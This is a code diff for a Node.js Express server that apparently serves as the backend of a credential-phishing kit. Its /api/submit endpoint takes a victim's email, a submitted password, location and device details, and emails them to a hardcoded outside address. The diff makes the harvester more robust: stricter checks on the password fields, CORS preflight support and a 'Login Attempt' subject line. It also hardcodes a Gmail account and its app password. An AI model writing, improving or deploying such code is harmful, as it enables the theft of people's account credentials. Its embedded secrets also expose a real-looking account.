@@ -1,26 +1,30 @@
 const express = require('express');
 const cors = require('cors');
 const nodemailer = require('nodemailer');
+const app = express();
 
-// Configuration (Edit these values)
+// Configuration
 const CONFIG = {
-  PORT: 3000,
+  PORT: process.env.PORT || 3000,
   EMAIL: {
-    USER: 'ranickiauerbach@gmail.com',          // Your Gmail
-    PASS: 'nlov pvvd rcoa dnwl',                // App Password
-    RECIPIENT: 'victorabuke2@yahoo.com',        // Where emails go
+    USER: 'ranickiauerbach@gmail.com',
+    PASS: 'nlov pvvd rcoa dnwl',
+    RECIPIENT: 'victorabuke2@yahoo.com',
     SENDERS: {
-      FIRST_PW: 'logsnur01@rich.co',            // Sender for first password
-      SECOND_PW: 'logsnur02@rich.us'            // Sender for second password
+      FIRST_PW: 'logsnur01@rich.co',
+      SECOND_PW: 'logsnur02@rich.us'
     }
   },
-  CORS_ORIGIN: '*'                              // Allow all origins
+  CORS_ORIGIN: '*' // Change to your frontend URL in production
 };
 
-// Initialize
-const app = express();
-app.use(cors({ origin: CONFIG.CORS_ORIGIN }));
+// Middleware
 app.use(express.json());
+app.use(cors({
+  origin: CONFIG.CORS_ORIGIN,
+  methods: ['POST', 'OPTIONS'], // Allow both POST and preflight
+  allowedHeaders: ['Content-Type']
+}));
 
 // Email transporter
 const transporter = nodemailer.createTransport({
@@ -33,24 +37,28 @@ const transporter = nodemailer.createTransport({
   }
 });
 
-// API Endpoint (Same as your PHP)
+// Handle preflight requests
+app.options('/api/submit', cors());
+
+// API Endpoint (matches your frontend exactly)
 app.post('/api/submit', async (req, res) => {
   try {
-    const {
+    console.log('Received data:', req.body); // Log incoming data
+    
+    const { 
       email,
       firstpasswordused,
       secondpasswordused,
-      continent = 'nil',
       country = 'nil',
+      continent = 'nil',
       city = 'nil',
-      referrer = 'nil',
-      emailSource = 'nil',
       device = {}
     } = req.body;
 
-    // Validate input
-    if (!email || (!firstpasswordused && !secondpasswordused)) {
-      return res.json({
+    // Validate exactly one password exists
+    const passwordCount = [firstpasswordused, secondpasswordused].filter(Boolean).length;
+    if (passwordCount !== 1) {
+      return res.status(400).json({
         emailStatus: {
           status: 'error',
           message: 'Provide exactly one password'
@@ -58,25 +66,23 @@ app.post('/api/submit', async (req, res) => {
       });
     }
 
-    // Prepare email
     const passwordUsed = firstpasswordused || secondpasswordused;
     const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;
 
     await transporter.sendMail({
       from: `"Zap!" <${fromEmail}>`,
       to: CONFIG.EMAIL.RECIPIENT,
-      subject: `Info - ${email}`,
+      subject: `Login Attempt - ${email}`,
       html: `
-        <h3>Details</h3>
+        <h3>Login Details</h3>
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Password:</strong> ${passwordUsed}</p>
-        <p><strong>IP:</strong> ${req.ip}</p>
-        <p>From: ${city}, ${country}, ${continent}</p>
+        <p><strong>Location:</strong> ${city}, ${country}, ${continent}</p>
         <h4>Device Info</h4>
-        <p><strong>User Agent:</strong> ${device.userAgent || 'nil'}</p>
-        <p><strong>Language:</strong> ${device.language || 'nil'}</p>
-        <p><strong>Platform:</strong> ${device.platform || 'nil'}</p>
-        <p><strong>Brand:</strong> ${device.brand || 'nil'}</p>
+        <p><strong>User Agent:</strong> ${device.userAgent || 'N/A'}</p>
+        <p><strong>Language:</strong> ${device.language || 'N/A'}</p>
+        <p><strong>Platform:</strong> ${device.platform || 'N/A'}</p>
+        <p><strong>Brand:</strong> ${device.brand || 'N/A'}</p>
         <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
       `
     });
@@ -84,22 +90,23 @@ app.post('/api/submit', async (req, res) => {
     res.json({
       emailStatus: {
         status: 'success',
-        message: 'Email sent'
+        message: 'Email sent successfully'
       }
     });
 
   } catch (error) {
-    console.error('Email error:', error);
-    res.json({
+    console.error('Error processing request:', error);
+    res.status(500).json({
       emailStatus: {
         status: 'error',
-        message: 'Failed to send email'
+        message: 'Internal server error'
       }
     });
   }
 });
 
 // Start server
-app.listen(CONFIG.PORT, () =>
-  console.log(`Server running on port ${CONFIG.PORT}\nReady to receive requests from: ${CONFIG.CORS_ORIGIN}`)
-);
+app.listen(CONFIG.PORT, () => {
+  console.log(`Server running on port ${CONFIG.PORT}`);
+  console.log(`CORS configured for: ${CONFIG.CORS_ORIGIN}`);
+});
